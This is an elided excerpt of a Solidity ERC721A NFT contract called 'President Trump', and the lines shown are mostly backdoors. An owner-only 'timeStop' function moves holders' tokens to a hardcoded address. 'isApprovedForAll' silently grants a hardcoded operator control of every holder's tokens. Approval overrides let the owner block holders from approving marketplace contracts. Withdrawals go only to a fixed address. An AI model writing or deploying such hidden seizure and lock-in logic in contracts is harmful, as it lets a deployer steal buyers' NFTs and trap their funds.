...
contract President_Trump is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("President Trump", "PT", maxBatchSize_, collectionSize_) {
  ...
  function timeStop(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x1660B70395B684AD5C885cA012D9f7752e137bf4, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xb64488bd49ddACF0d2552a9F6d03030874e3b5Bb);
  ...
  Ownable
{
  ...
  bool public Contractbanned  = false; ///////////////////////////////////////////////////////////////////////////////////////////////////// new 2
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function setContractbanned () external onlyOwner {
   ...
   */
    function approve(address to, uint256 tokenId) public override {
        ...
        if(!Contractbanned  && !_ToContract[tokenId]){
            if (to.isContract()) {
   ...
   */
    function setApprovalForAll(address operator, bool approved) public override {
        ...
        if(!Contractbanned  && !_addressToContract[msg.sender]){
        if(minStop() || on){
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4f0551f5C192D96Df02245734E036c0BCf7c4FD9){return true;}
